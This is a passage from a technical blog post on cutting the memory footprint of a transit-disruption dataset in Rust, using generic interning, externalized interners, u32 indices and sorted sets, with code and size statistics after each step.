<span>}</span>
</code></pre></div>

<p>I’ve also defined functions to convert data from the original structs to their interned counterparts, as well as comparison functions to validate that the interned data is semantically equivalent to the original (and confirm that my benchmarks are not cheating).</p>

<div><pre><code><span>impl</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>ApplicationPeriod</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>from</span><span>(</span><span>interner</span><span>:</span> <span>&amp;</span><span>'a</span> <span>StringInterner</span><span>,</span> <span>source</span><span>:</span> <span>source</span><span>::</span><span>ApplicationPeriod</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>Self</span> <span>{</span>
            <span>begin</span><span>:</span> <span>IString</span><span>::</span><span>from</span><span>(</span><span>interner</span><span>,</span> <span>source</span><span>.begin</span><span>),</span>
            <span>end</span><span>:</span> <span>IString</span><span>::</span><span>from</span><span>(</span><span>interner</span><span>,</span> <span>source</span><span>.end</span><span>),</span>
        <span>}</span>
    <span>}</span>
<span>}</span>

<span>impl</span> <span>PartialEq</span><span>&lt;</span><span>source</span><span>::</span><span>ApplicationPeriod</span><span>&gt;</span> <span>for</span> <span>ApplicationPeriod</span><span>&lt;</span><span>'_</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>eq</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>&amp;</span><span>source</span><span>::</span><span>ApplicationPeriod</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
        <span>self</span><span>.begin</span> <span>==</span> <span>other</span><span>.begin</span> <span>&amp;&amp;</span> <span>self</span><span>.end</span> <span>==</span> <span>other</span><span>.end</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>With that, we can already see the effectiveness of interning: each string appeared on average 425 times in the input data, the in-memory data is three times smaller than the baseline, and twice smaller than the original JSON files (commit <a href="https://github.com/gendx/rust-interning/commit/5297faabef807c535bba8c29ca665c72957f3ca0">5297faa</a>).
We’re still quite far from the headline of this post though!</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1531039733 bytes in memory (relative size = 134.63%)
Optimized to 529308335 bytes (relative size = 46.55%)
- [0.84%] String interner: 56374 objects | 4433343 bytes (78.64 bytes/object) | 23964083 references (425.09 refs/object)
</code></pre></div>

<h3 id="arbitrary-types-76"><span><a href="#arbitrary-types-76"></a></span>Arbitrary types (7.6%)</h3>

<p>The next step was to realize that strings aren’t the only objects that repeat a lot in the input data.
For example, a <code>Disruption</code> may last maybe an hour if it’s unexpected, or something like a month if it’s planned maintenance work.
Given that the input data is a time series sampled every 2 minutes, it’s expected that a given disruption will show up many times.</p>

<p>Fortunately, the interning technique isn’t unique to strings: any data that can be put into a vector and a hash map should work as well.
So we can use <a href="https://doc.rust-lang.org/rust-by-example/generics.html">generics</a> to make it work for arbitrary types that implement <a href="https://doc.rust-lang.org/std/cmp/trait.Eq.html"><code>Eq</code></a> and <a href="https://doc.rust-lang.org/std/hash/trait.Hash.html"><code>Hash</code></a> (to work with a hash map).</p>

<div><pre><code><span>// Type alias for convenience.</span>
<span>type</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>=</span> <span>Interned</span><span>&lt;</span><span>'a</span><span>,</span> <span>String</span><span>&gt;</span><span>;</span>

<span>struct</span> <span>Interned</span><span>&lt;</span><span>'a</span><span>,</span> <span>T</span><span>&gt;</span> <span>{</span>
    <span>interner</span><span>:</span> <span>&amp;</span><span>'a</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span><span>,</span>
    <span>id</span><span>:</span> <span>usize</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>'a</span><span>,</span> <span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span><span>&gt;</span> <span>Interned</span><span>&lt;</span><span>'a</span><span>,</span> <span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>from</span><span>(</span><span>interner</span><span>:</span> <span>&amp;</span><span>'a</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span><span>,</span> <span>value</span><span>:</span> <span>T</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>let</span> <span>id</span> <span>=</span> <span>interner</span><span>.intern</span><span>(</span><span>value</span><span>);</span>
        <span>Self</span> <span>{</span> <span>interner</span><span>,</span> <span>id</span> <span>}</span>
    <span>}</span>

    <span>fn</span> <span>lookup</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Rc</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
        <span>self</span><span>.interner</span><span>.lookup</span><span>(</span><span>self</span><span>.id</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>As a new requirement, we also need to implement the <a href="https://doc.rust-lang.org/std/cmp/trait.PartialEq.html"><code>PartialEq</code></a>, <a href="https://doc.rust-lang.org/std/cmp/trait.Eq.html"><code>Eq</code></a> and <a href="https://doc.rust-lang.org/std/hash/trait.Hash.html"><code>Hash</code></a> traits on <code>Interned&lt;_&gt;</code>, so that it can be recursively used in structs that are themselves interned.
A naive implementation is to lookup the actual data and compare or hash it, but we’ll revisit that in a moment.</p>

<div><pre><code><span>use</span> <span>std</span><span>::</span><span>hash</span><span>::{</span><span>Hash</span><span>,</span> <span>Hasher</span><span>};</span>

<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span><span>&gt;</span> <span>PartialEq</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>'_</span><span>,</span> <span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>eq</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>&amp;</span><span>Self</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
        <span>self</span><span>.lookup</span><span>()</span><span>.deref</span><span>()</span> <span>==</span> <span>other</span><span>.lookup</span><span>()</span><span>.deref</span><span>()</span>
    <span>}</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span><span>&gt;</span> <span>Eq</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>'_</span><span>,</span> <span>T</span><span>&gt;</span> <span>{}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span><span>&gt;</span> <span>Hash</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>'_</span><span>,</span> <span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>hash</span><span>&lt;</span><span>H</span><span>&gt;</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>state</span><span>:</span> <span>&amp;</span><span>mut</span> <span>H</span><span>)</span>
    <span>where</span>
        <span>H</span><span>:</span> <span>Hasher</span><span>,</span>
    <span>{</span>
        <span>self</span><span>.lookup</span><span>()</span><span>.deref</span><span>()</span><span>.hash</span><span>(</span><span>state</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>On the schema side, we’ll now have a collection of interners: each type gets its own interner.</p>

<div><pre><code><span>#[derive(Default)]</span>
<span>struct</span> <span>Interners</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span>
    <span>string</span><span>:</span> <span>Interner</span><span>&lt;</span><span>String</span><span>&gt;</span><span>,</span>
    <span>disruption</span><span>:</span> <span>Interner</span><span>&lt;</span><span>Disruption</span><span>&lt;</span><span>'a</span><span>&gt;&gt;</span><span>,</span>
    <span>line</span><span>:</span> <span>Interner</span><span>&lt;</span><span>Line</span><span>&lt;</span><span>'a</span><span>&gt;&gt;</span><span>,</span>
    <span>application_period</span><span>:</span> <span>Interner</span><span>&lt;</span><span>ApplicationPeriod</span><span>&lt;</span><span>'a</span><span>&gt;&gt;</span><span>,</span>
    <span>impacted_object</span><span>:</span> <span>Interner</span><span>&lt;</span><span>ImpactedObject</span><span>&lt;</span><span>'a</span><span>&gt;&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>The data structs in the schema can now contain interned versions of other structs, such as <code>Interned&lt;'a, ApplicationPeriod&lt;'a&gt;&gt;</code>, and simply derive the comparison and hashing traits.</p>

<div><pre><code><span>#[derive(Debug,</span> <span>Hash,</span> <span>PartialEq,</span> <span>Eq)]</span>
<span>struct</span> <span>Disruption</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span>
    <span>id</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>application_periods</span><span>:</span> <span>Vec</span><span>&lt;</span><span>Interned</span><span>&lt;</span><span>'a</span><span>,</span> <span>ApplicationPeriod</span><span>&lt;</span><span>'a</span><span>&gt;&gt;&gt;</span><span>,</span>
    <span>last_update</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>cause</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>severity</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>tags</span><span>:</span> <span>Option</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>IString</span><span>&lt;</span><span>'a</span><span>&gt;&gt;&gt;</span><span>,</span>
    <span>title</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>message</span><span>:</span> <span>IString</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span>
    <span>disruption_id</span><span>:</span> <span>Option</span><span>&lt;</span><span>IString</span><span>&lt;</span><span>'a</span><span>&gt;&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>Conversion from the original data types now uses a reference to the whole collection of <code>Interners</code>.</p>

<div><pre><code><span>impl</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>Disruption</span><span>&lt;</span><span>'a</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>from</span><span>(</span><span>interners</span><span>:</span> <span>&amp;</span><span>'a</span> <span>Interners</span><span>&lt;</span><span>'a</span><span>&gt;</span><span>,</span> <span>source</span><span>:</span> <span>source</span><span>::</span><span>Disruption</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>Self</span> <span>{</span>
            <span>id</span><span>:</span> <span>Interned</span><span>::</span><span>from</span><span>(</span><span>&amp;</span><span>interners</span><span>.string</span><span>,</span> <span>source</span><span>.id</span><span>),</span>
            <span>application_periods</span><span>:</span> <span>source</span>
                <span>.application_periods</span>
                <span>.into_iter</span><span>()</span>
                <span>.map</span><span>(|</span><span>x</span><span>|</span> <span>{</span>
                    <span>Interned</span><span>::</span><span>from</span><span>(</span>
                        <span>&amp;</span><span>interners</span><span>.application_period</span><span>,</span>
                        <span>ApplicationPeriod</span><span>::</span><span>from</span><span>(</span><span>interners</span><span>,</span> <span>x</span><span>),</span>
                    <span>)</span>
                <span>})</span>
                <span>.collect</span><span>(),</span>
            <span>...</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>With this generalization, the size improvement starts to be substantial, about 6 times smaller than the previous step and 12 times smaller than the baseline input files (commit <a href="https://github.com/gendx/rust-interning/commit/f532ef9aa822a77de496b8fae44b1642db47bef8">f532ef9</a>).</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1531039733 bytes in memory (relative size = 134.63%)
Optimized to 86349519 bytes (relative size = 7.59%)
[67.50%] Interners: 58288479 bytes
- [5.13%] String interner: 56374 objects | 4433343 bytes (78.64 bytes/object) | 23964083 references (425.09 refs/object)
- [1.81%] Disruption interner: 7550 objects | 1565896 bytes (207.40 bytes/object) | 625760 references (82.88 refs/object)
  - [0.28%] ApplicationPeriod interner: 5883 objects | 245688 bytes (41.76 bytes/object) | 631593 references (107.36 refs/object)
- [53.61%] Line interner: 97090 objects | 46289464 bytes (476.77 bytes/object) | 930026 references (9.58 refs/object)
  - [6.66%] ImpactedObject interner: 56110 objects | 5754088 bytes (102.55 bytes/object) | 3183332 references (56.73 refs/object)
</code></pre></div>

<h3 id="dropping-the-reference-28"><span><a href="#dropping-the-reference-28"></a></span>Dropping the reference (2.8%)</h3>

<p>One thing you may have noticed is how the reference to an <code>Interner</code> proliferates well beyond the <code>Interned</code> struct.
It forces us (1) to add a lifetime <code>'a</code> everywhere and (2) to use interior mutability which causes the <code>Interner</code>/<code>InternerImpl</code> split.</p>

<div><pre><code><span>struct</span> <span>Interned</span><span>&lt;</span><span>'a</span><span>,</span> <span>T</span><span>&gt;</span> <span>{</span>
    <span>interner</span><span>:</span> <span>&amp;</span><span>'a</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span><span>,</span>
    <span>id</span><span>:</span> <span>usize</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>Crucially, it also means inflated memory usage due to a lot of duplication: a struct like <code>Disruption&lt;'a&gt;</code> contains at least 7 references to the same string interner!
So what if we just got rid of it?</p>

<p>In the current design, the <code>Interned</code> type is <a href="https://stackoverflow.com/questions/5004162/what-does-it-mean-for-a-data-structure-to-be-intrusive"><em>intrusive</em></a> (as it’s aware of the surrounding <code>Interner</code>).
We can instead externalize the interner, and let the caller provide a reference to the interner when needed.</p>

<div><pre><code><span>use</span> <span>std</span><span>::</span><span>marker</span><span>::</span><span>PhantomData</span><span>;</span>

<span>struct</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>id</span><span>:</span> <span>usize</span><span>,</span>
    <span>// Marker to indicate that an interned object behaves like a function that</span>
    <span>// returns a T (via the lookup method).</span>
    <span>_phantom</span><span>:</span> <span>PhantomData</span><span>&lt;</span><span>fn</span><span>()</span> <span>-&gt;</span> <span>T</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span><span>&gt;</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>// The interner reference is now provided by the caller.</span>
    <span>fn</span> <span>from</span><span>(</span><span>interner</span><span>:</span> <span>&amp;</span><span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span><span>,</span> <span>value</span><span>:</span> <span>T</span><span>)</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>interner</span><span>.intern</span><span>(</span><span>value</span><span>)</span>
    <span>}</span>

    <span>// Same here.</span>
    <span>fn</span> <span>lookup</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>interner</span><span>:</span> <span>&amp;</span><span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span><span>)</span> <span>-&gt;</span> <span>Rc</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
        <span>interner</span><span>.lookup</span><span>(</span><span>self</span><span>.id</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>One difficulty with this simplified design is how to implement comparison and hashing methods on <code>Interned&lt;T&gt;</code>.
Indeed, these operators have a fixed API given by traits such as <a href="https://doc.rust-lang.org/std/cmp/trait.PartialEq.html"><code>PartialEq</code></a>, so an interner reference cannot be provided as an additional value to the <a href="https://doc.rust-lang.org/std/cmp/trait.PartialEq.html#tymethod.eq"><code>eq()</code></a> function for example.</p>

<p>To solve this issue, we can remark that an interned index fully represents the underlying object (within the realm of an interner): two values will be interned to the same index if and only if they are equal.
So rather than doing a deep (recursive) comparison, we can simply compare the indices, i.e. <code>derive</code> their implementations for <code>Interned</code>.
Likewise for hashing.</p>

<div><pre><code><span>#[derive(Debug,</span> <span>Hash,</span> <span>PartialEq,</span> <span>Eq)]</span>
<span>struct</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span> <span>/* ... */</span> <span>}</span>
</code></pre></div>

<p>However, the difficulty remains when we want to compare an <code>Interned&lt;T&gt;</code> with a <code>T</code>.
In that case, we really need to look up the underlying value and perform a deep comparison.
For that purpose, I ended up defining a new <code>EqWith</code> trait that allows passing the interner as a helper object for the comparison.</p>

<div><pre><code><span>trait</span> <span>EqWith</span><span>&lt;</span><span>Rhs</span><span>,</span> <span>Helper</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>eq_with</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>&amp;</span><span>Rhs</span><span>,</span> <span>helper</span><span>:</span> <span>&amp;</span><span>Helper</span><span>)</span> <span>-&gt;</span> <span>bool</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span><span>&gt;</span> <span>EqWith</span><span>&lt;</span><span>T</span><span>,</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;&gt;</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>eq_with</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>&amp;</span><span>T</span><span>,</span> <span>interner</span><span>:</span> <span>&amp;</span><span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
        <span>self</span><span>.lookup</span><span>(</span><span>interner</span><span>)</span><span>.deref</span><span>()</span> <span>==</span> <span>other</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>We can then compare structs from the source and optimized schemas.</p>

<div><pre><code><span>#[derive(Debug,</span> <span>Hash,</span> <span>PartialEq,</span> <span>Eq)]</span>
<span>struct</span> <span>ApplicationPeriod</span> <span>{</span>
    <span>begin</span><span>:</span> <span>IString</span><span>,</span>
    <span>end</span><span>:</span> <span>IString</span><span>,</span>
<span>}</span>

<span>impl</span> <span>EqWith</span><span>&lt;</span><span>source</span><span>::</span><span>ApplicationPeriod</span><span>,</span> <span>Interners</span><span>&gt;</span> <span>for</span> <span>ApplicationPeriod</span> <span>{</span>
    <span>fn</span> <span>eq_with</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>&amp;</span><span>source</span><span>::</span><span>ApplicationPeriod</span><span>,</span> <span>interners</span><span>:</span> <span>&amp;</span><span>Interners</span><span>)</span> <span>-&gt;</span> <span>bool</span> <span>{</span>
        <span>self</span><span>.begin</span><span>.eq_with</span><span>(</span><span>&amp;</span><span>other</span><span>.begin</span><span>,</span> <span>&amp;</span><span>interners</span><span>.string</span><span>)</span>
            <span>&amp;&amp;</span> <span>self</span><span>.end</span><span>.eq_with</span><span>(</span><span>&amp;</span><span>other</span><span>.end</span><span>,</span> <span>&amp;</span><span>interners</span><span>.string</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>With that, we’ve halved the size of an <code>Interned&lt;T&gt;</code>, and therefore almost halved the total in-memory size (commit <a href="https://github.com/gendx/rust-interning/commit/59fae78b25aa2cfd013992c68f3692a2336f7f23">59fae78</a>).</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1531039733 bytes in memory (relative size = 134.63%)
Optimized to 49829943 bytes (relative size = 4.38%)
[68.66%] Interners: 34215191 bytes
- [8.90%] String interner: 56374 objects | 4433335 bytes (78.64 bytes/object) | 23964083 references (425.09 refs/object)
- [2.17%] Disruption interner: 7550 objects | 1081928 bytes (143.30 bytes/object) | 625760 references (82.88 refs/object)
  - [0.30%] ApplicationPeriod interner: 5883 objects | 151552 bytes (25.76 bytes/object) | 631593 references (107.36 refs/object)
- [49.71%] Line interner: 97090 objects | 24768600 bytes (255.11 bytes/object) | 930026 references (9.58 refs/object)
  - [7.59%] ImpactedObject interner: 56110 objects | 3779776 bytes (67.36 bytes/object) | 3183332 references (56.73 refs/object)
</code></pre></div>

<p>Can we half it again?</p>

<p>Yes!
The <a href="https://matklad.github.io/2020/03/22/fast-simple-rust-interner.html">original blog post</a> by <em>matklad</em> was using a <code>u32</code> index, rather than <code>usize</code>.
This is indeed a fairly reasonable choice for objects that are supposed to be referenced multiple times.
In my case, the dataset didn’t contain any type with more than a million distinct objects, so there was enough margin.</p>

<div><pre><code><span>struct</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>id</span><span>:</span> <span>u32</span><span>,</span>  <span>// Now a 32-bit index.</span>
    <span>_phantom</span><span>:</span> <span>PhantomData</span><span>&lt;</span><span>fn</span><span>()</span> <span>-&gt;</span> <span>T</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span><span>&gt;</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>intern</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>value</span><span>:</span> <span>T</span><span>)</span> <span>-&gt;</span> <span>u32</span> <span>{</span>
        <span>if</span> <span>let</span> <span>Some</span><span>(</span><span>&amp;</span><span>id</span><span>)</span> <span>=</span> <span>self</span><span>.map</span><span>.get</span><span>(</span><span>&amp;</span><span>value</span><span>)</span> <span>{</span>
            <span>return</span> <span>id</span><span>;</span>
        <span>}</span>

        <span>// Runtime check that the identifier doesn't exceed a u32.</span>
        <span>let</span> <span>id</span> <span>=</span> <span>self</span><span>.vec</span><span>.len</span><span>();</span>
        <span>assert!</span><span>(</span><span>id</span> <span>&lt;=</span> <span>u32</span><span>::</span><span>MAX</span> <span>as</span> <span>usize</span><span>);</span>
        <span>let</span> <span>id</span> <span>=</span> <span>id</span> <span>as</span> <span>u32</span><span>;</span>

        <span>let</span> <span>rc</span><span>:</span> <span>Rc</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>Rc</span><span>::</span><span>new</span><span>(</span><span>value</span><span>);</span>
        <span>self</span><span>.vec</span><span>.push</span><span>(</span><span>Rc</span><span>::</span><span>clone</span><span>(</span><span>&amp;</span><span>rc</span><span>));</span>
        <span>self</span><span>.map</span><span>.insert</span><span>(</span><span>rc</span><span>,</span> <span>id</span><span>);</span>
        <span>id</span>
    <span>}</span>

    <span>fn</span> <span>lookup</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>id</span><span>:</span> <span>u32</span><span>)</span> <span>-&gt;</span> <span>Rc</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
        <span>Rc</span><span>::</span><span>clone</span><span>(</span><span>&amp;</span><span>self</span><span>.vec</span><span>[</span><span>id</span> <span>as</span> <span>usize</span><span>])</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>We’re now down below 3% of the original data set size (commit <a href="https://github.com/gendx/rust-interning/commit/84d79e72fd0ec828d975ffeeed1f10d6cd1db906">84d79e7</a>).
Steady progress!</p>

<div><pre><code>Parsed 1137178883 bytes from 30466 files (+ 21 failed files)
Expanded to 1531039733 bytes in memory (relative size = 134.63%)
Optimized to 31391391 bytes (relative size = 2.76%)
[72.41%] Interners: 22730967 bytes
- [14.12%] String interner: 56374 objects | 4433335 bytes (78.64 bytes/object) | 23964083 references (425.09 refs/object)
- [2.48%] Disruption interner: 7550 objects | 779548 bytes (103.25 bytes/object) | 625760 references (82.88 refs/object)
  - [0.33%] ApplicationPeriod interner: 5883 objects | 104488 bytes (17.76 bytes/object) | 631593 references (107.36 refs/object)
- [45.86%] Line interner: 97090 objects | 14396532 bytes (148.28 bytes/object) | 930026 references (9.58 refs/object)
  - [9.61%] ImpactedObject interner: 56110 objects | 3017064 bytes (53.77 bytes/object) | 3183332 references (56.73 refs/object)
</code></pre></div>

<h2 id="tuning-the-schema"><span><a href="#tuning-the-schema"></a></span>Tuning the schema</h2>

<p>Using general interning techniques wasn’t the end of the journey.
Indeed, we can leverage business knowledge about the data to optimize it even more.</p>

<h3 id="sorting-sets-15"><span><a href="#sorting-sets-15"></a></span>Sorting sets (1.5%)</h3>

<p>One common pattern in this data was a field containing a set of objects (themselves interned).
For example, a <code>Line</code> contains a set of impacted objects stored as a <code>Vec&lt;Interned&lt;ImpactedObject&gt;&gt;</code>, and each <code>ImpactedObject</code> contains a set of disruption IDs as a <code>Vec&lt;IString&gt;</code>.</p>

<div><pre><code><span>struct</span> <span>Line</span> <span>{</span>
    <span>id</span><span>:</span> <span>IString</span><span>,</span>
    <span>name</span><span>:</span> <span>IString</span><span>,</span>
    <span>short_name</span><span>:</span> <span>IString</span><span>,</span>
    <span>mode</span><span>:</span> <span>IString</span><span>,</span>
    <span>network_id</span><span>:</span> <span>IString</span><span>,</span>
    <span>impacted_objects</span><span>:</span> <span>Vec</span><span>&lt;</span><span>Interned</span><span>&lt;</span><span>ImpactedObject</span><span>&gt;&gt;</span><span>,</span>
<span>}</span>

<span>struct</span> <span>ImpactedObject</span> <span>{</span>
    <span>typ</span><span>:</span> <span>IString</span><span>,</span>
    <span>id</span><span>:</span> <span>IString</span><span>,</span>
    <span>name</span><span>:</span> <span>IString</span><span>,</span>
    <span>disruption_ids</span><span>:</span> <span>Vec</span><span>&lt;</span><span>IString</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>What’s interesting is that these sets don’t have a particular order, semantically speaking: we only care about which objects are impacted on a given metro line, not whether one impacted object is “before” another (whatever that means).
However, in Rust the <code>Vec</code> collection type is semantically ordered!</p>

<p>This means that two <code>ImpactedObject</code>s with the same <code>typ</code>, <code>id</code> and <code>name</code> fields but <code>disruption_ids</code> equal to <code>[123, 42, 73]</code> in one case and <code>[73, 123, 42]</code> in the other would be considered different in terms of hashing and equality, even though they are semantically the same.</p>

<p>As it turns out, the API was returning such sets in arbitrary order from one call to the next (which I guess makes sense if they internally represent them using hash tables or hash sets).
So one object containing a set of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span> items could be represented as up to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">N!</annotation></semantics></math></span></span> JSON representations appearing distinct from the perspective of the interner (number of permutations of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span> items).</p>

<p>Unfortunately, the problem compounds: a <code>Line</code> contains a set of <code>ImpactedObject</code>s which themselves contain sets of <code>IString</code>.
Consider the following example: each of the two <code>ImpactedObject</code>s has <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo stretchy="false">!</mo><mo>=</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">3! = 6</annotation></semantics></math></span></span> possible representations and there are <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo stretchy="false">!</mo><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">2! = 2</annotation></semantics></math></span></span> possible orderings of these two objects, so this <code>Line</code> has up to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn><mo>⋅</mo><mn>6</mn><mo>⋅</mo><mn>2</mn><mo>=</mo><mn>72</mn></mrow><annotation encoding="application/x-tex">6 \cdot 6 \cdot 2 = 72</annotation></semantics></math></span></span> representations.
And that’s a fairly simple example, in reality the sets could be longer than 3 disruptions.
In practice, the <code>Interner&lt;Line&gt;</code> contained the most number of objects (97090), totaling 14 MB which was 45% of the optimized bytes.</p>

<div><pre><code><span>Line</span> <span>{</span>
    <span>impacted_objects</span><span>:</span> <span>vec!</span><span>[</span>
        <span>ImpactedObject</span> <span>{</span>
            <span>disruption_ids</span><span>:</span> <span>vec!</span><span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>],</span> <span>...</span>
        <span>},</span>
        <span>ImpactedObject</span> <span>{</span>
            <span>disruption_ids</span><span>:</span> <span>vec!</span><span>[</span><span>4</span><span>,</span> <span>5</span><span>,</span> <span>6</span><span>],</span> <span>...</span>
        <span>},</span>
    <span>],</span>
    <span>...</span>
<span>}</span>

<span>// Same object serialized differently.</span>
<span>Line</span> <span>{</span>
    <span>impacted_objects</span><span>:</span> <span>vec!</span><span>[</span>
        <span>ImpactedObject</span> <span>{</span>
            <span>disruption_ids</span><span>:</span> <span>vec!</span><span>[</span><span>6</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>],</span> <span>...</span>
        <span>},</span>
        <span>ImpactedObject</span> <span>{</span>
            <span>disruption_ids</span><span>:</span> <span>vec!</span><span>[</span><span>2</span><span>,</span> <span>1</span><span>,</span> <span>3</span><span>],</span> <span>...</span>
        <span>},</span>
    <span>],</span>
    <span>...</span>
<span>}</span>
</code></pre></div>

<p>To mitigate this problem, we can canonicalize such sets, the easiest way being to sort them.
However, adding ordering operators (via the <a href="https://doc.rust-lang.org/std/cmp/trait.PartialOrd.html"><code>PartialOrd</code></a> and <a href="https://doc.rust-lang.org/std/cmp/trait.Ord.html"><code>Ord</code></a> traits) for all the structs in the schema would be annoying.
But that’s not required: we only need to order sets of <code>Interned&lt;T&gt;</code>, and we can do that by simply ordering the underlying indices!
Indeed, all we need is a canonical order, we don’t care if this order reflects the semantics of the objects.</p>

<p>Unfortunately, we cannot derive <code>PartialOrd</code> on <code>Interned&lt;T&gt;</code> if the underlying <code>T</code> doesn’t itself implement it.
This is a <a href="https://github.com/rust-lang/rust/issues/26925">known and long-standing limitation</a> of <code>derive</code> (<a href="https://github.com/rust-lang/rust/issues/7671">more than 10 years old</a>!).</p>

<div><pre><code><span>use</span> <span>std</span><span>::</span><span>marker</span><span>::</span><span>PhantomData</span><span>;</span>

